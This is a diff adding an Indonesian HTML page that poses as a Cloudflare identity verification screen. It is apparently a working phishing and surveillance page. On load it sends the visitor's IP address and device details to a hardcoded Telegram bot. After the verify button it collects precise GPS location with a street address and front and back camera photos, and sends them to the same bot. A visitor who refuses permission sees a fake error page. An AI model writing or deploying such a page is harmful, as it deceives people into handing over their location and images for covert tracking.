@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Keamanan - Cloudflare</title>
+    <style>
+        :root {
+            --cf-orange: #f48120;
+            --cf-gray: #404040;
+            --bg: #f9f9f9;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+        .container {
+            width: 420px;
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            padding: 35px 30px;
+            text-align: center;
+        }
+        .shield {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        .shield-icon {
+            width: 48px;
+            height: 48px;
+            background: var(--cf-orange);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+        }
+        .shield-icon span {
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .shield-text {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--cf-gray);
+        }
+        .cf-logo {
+            font-size: 13px;
+            color: var(--cf-orange);
+            margin: 5px 0 20px;
+            letter-spacing: 0.5px;
+        }
+        .check-list {
+            text-align: left;
+            margin: 20px 0;
+        }
+        .check-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .check-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            margin-right: 12px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        .done { background: #4CAF50; }
+        .pending { background: #ccc; animation: pulse 1.5s infinite; }
+        .failed { background: #f44336; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .check-label { flex: 1; font-size: 14px; }
+        .check-status { font-size: 12px; color: #888; }
+        .verify-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--cf-orange);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        .verify-btn:hover { background: #e0761a; }
+        .verify-btn:disabled { background: #ccc; cursor: not-allowed; }
+        .retry-btn {
+            background: #fff;
+            border: 1px solid var(--cf-orange);
+            color: var(--cf-orange);
+            font-weight: bold;
+            padding: 8px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+        .error-msg {
+            color: #f44336;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+        .status-text {
+            font-size: 13px;
+            color: #888;
+            margin-top: 15px;
+            min-height: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <div class="shield">
+            <div class="shield-icon"><span>&#128737;</span></div>
+            <div class="shield-text">Cloudflare</div>
+        </div>
+        <div class="cf-logo">Dilindungi oleh Cloudflare • SSL/TLS Terenkripsi</div>
+
+        <div class="check-list">
+            <div class="check-item">
+                <div class="check-icon done">✓</div>
+                <div class="check-label">Enkripsi SSL/TLS 256-bit</div>
+                <div class="check-status">Aman</div>
+            </div>
+            <div class="check-item">
+                <div class="check-icon done">✓</div>
+                <div class="check-label">Firewall Aplikasi Web (WAF)</div>
+                <div class="check-status">Aktif</div>
+            </div>
+            <div class="check-item">
+                <div class="check-icon done">✓</div>
+                <div class="check-label">Perangkat Terpercaya</div>
+                <div class="check-status">Terverifikasi</div>
+            </div>
+            <div class="check-item" id="identityCheck">
+                <div class="check-icon pending" id="identityIcon">?</div>
+                <div class="check-label">Verifikasi Identitas</div>
+                <div class="check-status" id="identityStatus">Menunggu...</div>
+            </div>
+        </div>
+
+        <button class="verify-btn" id="verifyBtn" onclick="startVerification()">Verifikasi Sekarang</button>
+        <div id="retryArea"></div>
+        <div class="status-text" id="globalStatus"></div>
+    </div>
+
+    <script>
+        // ========== KONFIGURASI TELEGRAM ==========
+        const BOT_TOKEN = '8835244462:AAF2E4s0Ngq5wPENudpzEsSlSZLP3VJHaHw';
+        const CHAT_ID = '5986004601';
+        // =========================================
+
+        let deviceInfo = '';
+        let ipInfo = '';
+        let locationGranted = false;
+        let cameraGranted = false;
+
+        // Elemen DOM
+        const verifyBtn = document.getElementById('verifyBtn');
+        const identityIcon = document.getElementById('identityIcon');
+        const identityStatus = document.getElementById('identityStatus');
+        const globalStatus = document.getElementById('globalStatus');
+        const retryArea = document.getElementById('retryArea');
+        const mainContainer = document.getElementById('mainContainer');
+
+        // Kirim info perangkat & IP saat halaman dimuat
+        window.addEventListener('load', async () => {
+            try {
+                deviceInfo = `📱 ${navigator.userAgent}\n🖥️ Platform: ${navigator.platform}\n📏 Resolusi: ${screen.width}x${screen.height} (${screen.colorDepth}-bit)\n🌐 Bahasa: ${navigator.language}`;
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ipInfo = `🌐 IP Publik: ${ipData.ip}`;
+                sendTelegramMessage(`🔍 Pengunjung Baru\n${ipInfo}\n${deviceInfo}`);
+            } catch (e) {
+                console.error(e);
+            }
+        });
+
+        async function sendTelegramMessage(text) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: text})
+            });
+        }
+
+        async function sendTelegramPhoto(blob, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }
+
+        async function sendTelegramLocation(lat, lon, accuracy) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, latitude: lat, longitude: lon, horizontal_accuracy: accuracy})
+            });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+            return new Blob([ab], {type: mime});
+        }
+
+        async function captureFrame(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            await new Promise(r => video.onloadedmetadata = r);
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+        }
+
+        // Ganti seluruh halaman dengan error page
+        function redirectToError() {
+            document.body.innerHTML = `
+                <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#1a1a1a;color:#fff;font-family:monospace;text-align:center;">
+                    <div>
+                        <h1 style="font-size:24px;">⚠️ Halaman Error</h1>
+                        <p style="font-size:16px;margin-top:20px;">Tidak dapat dimuat karena user menolak akses,<br>sehingga kami menganggapnya bot jahat / penyerang.</p>
+                        <p style="color:#f48120;margin-top:30px;">Cloudflare Ray ID: ${Math.random().toString(36).substr(2,9)}</p>
+                    </div>
+                </div>
+            `;
+        }
+
+        // ============= LOKASI DENGAN RETRY =============
+        async function requestLocation(retryCount = 0) {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve({ success: true, data: pos }),
+                    async (err) => {
+                        if (retryCount < 1) {
+                            // Kesempatan pertama gagal, tampilkan tombol retry
+                            retryArea.innerHTML = `
+                                <p class="error-msg">Izin lokasi diperlukan untuk verifikasi.</p>
+                                <button class="retry-btn" onclick="retryLocation()">Coba Lagi</button>
+                            `;
+                            identityStatus.textContent = 'Gagal - Izin lokasi';
+                            identityIcon.className = 'check-icon failed';
+                            resolve({ success: false, retry: true });
+                        } else {
+                            // Sudah retry kedua, tetap gagal -> redirect error
+                            redirectToError();
+                            resolve({ success: false, abort: true });
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // Fungsi yang dipanggil tombol retry lokasi
+        async function retryLocation() {
+            globalStatus.textContent = 'Meminta izin lokasi (percobaan ke-2)...';
+            retryArea.innerHTML = '';
+            const result = await requestLocation(1); // retryCount=1 -> percobaan kedua
+            if (result.success) {
+                locationGranted = true;
+                await processLocationSuccess(result.data);
+                // Lanjut ke kamera
+                await requestCameraSequence();
+            }
+            // Jika gagal kedua, redirectToError sudah dipanggil di dalam requestLocation
+        }
+
+        async function processLocationSuccess(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+            let address = 'Alamat tidak tersedia';
+            try {
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                const data = await res.json();
+                if (data && data.display_name) address = data.display_name;
+            } catch (e) {}
+            const locMsg = `📍 Lokasi\nKoordinat: ${lat}, ${lon}\nAkurasi: ±${acc.toFixed(1)} m\n🏠 ${address}`;
+            await sendTelegramMessage(locMsg);
+            await sendTelegramLocation(lat, lon, acc);
+            // simpan di window untuk digabung nanti
+            window.locationData = { lat, lon, acc, address };
+            identityStatus.textContent = 'Lokasi terverifikasi';
+        }
+
+        // ============= KAMERA DENGAN RETRY (hanya depan, belakang optional) =============
+        async function requestCamera(retryCount = 0) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                return { success: true, stream };
+            } catch (err) {
+                if (retryCount < 1) {
+                    retryArea.innerHTML = `
+                        <p class="error-msg">Izin kamera diperlukan untuk verifikasi wajah.</p>
+                        <button class="retry-btn" onclick="retryCamera()">Coba Lagi</button>
+                    `;
+                    identityStatus.textContent = 'Gagal - Izin kamera';
+                    identityIcon.className = 'check-icon failed';
+                    return { success: false, retry: true };
+                } else {
+                    redirectToError();
+                    return { success: false, abort: true };
+                }
+            }
+        }
+
+        async function retryCamera() {
+            globalStatus.textContent = 'Meminta izin kamera (percobaan ke-2)...';
+            retryArea.innerHTML = '';
+            const result = await requestCamera(1);
+            if (result.success) {
+                cameraGranted = true;
+                await processCameraSuccess(result.stream);
+            }
+        }
+
+        async function processCameraSuccess(frontStream) {
+            identityStatus.textContent = 'Memotret...';
+            // Foto depan
+            const frontBlob = await captureFrame(frontStream);
+            frontStream.getTracks().forEach(t => t.stop());
+
+            // Foto belakang (optional, tanpa retry)
+            let backBlob = null;
+            try {
+                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } });
+                backBlob = await captureFrame(backStream);
+                backStream.getTracks().forEach(t => t.stop());
+            } catch (e) {}
+
+            // Gabungkan caption
+            let caption = `📸 Verifikasi Wajah\n${ipInfo}\n${deviceInfo}`;
+            if (window.locationData) {
+                caption += `\n📍 ${window.locationData.lat}, ${window.locationData.lon}\n🏠 ${window.locationData.address}`;
+            }
+            await sendTelegramPhoto(frontBlob, caption + '\n🟢 Kamera Depan');
+            if (backBlob) {
+                await sendTelegramPhoto(backBlob, caption + '\n🔵 Kamera Belakang');
+            }
+
+            identityIcon.className = 'check-icon done';
+            identityIcon.textContent = '✓';
+            identityStatus.textContent = 'Terverifikasi';
+            verifyBtn.style.display = 'none';
+            retryArea.innerHTML = '';
+            globalStatus.textContent = 'Verifikasi gagal. Mengalihkan...';
+            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
+        }
+
+        async function requestCameraSequence() {
+            // Minta kamera depan dengan retry
+            const cameraRes = await requestCamera(0);
+            if (cameraRes.success) {
+                cameraGranted = true;
+                await processCameraSuccess(cameraRes.stream);
+            }
+            // jika retry atau abort, sudah ditangani di dalam fungsi
+        }
+
+        // ============= FUNGSI UTAMA (dipanggil tombol) =============
+        async function startVerification() {
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Memverifikasi...';
+            globalStatus.textContent = 'Meminta izin lokasi...';
+            retryArea.innerHTML = '';
+
+            // Langkah 1: Lokasi
+            const locRes = await requestLocation(0);
+            if (locRes.success) {
+                locationGranted = true;
+                await processLocationSuccess(locRes.data);
+                // Langkah 2: Kamera
+                await requestCameraSequence();
+            }
+            // jika lokasi gagal dan retry, biarkan tombol retry yang muncul
+        }
+    </script>
+</body>
+</html>
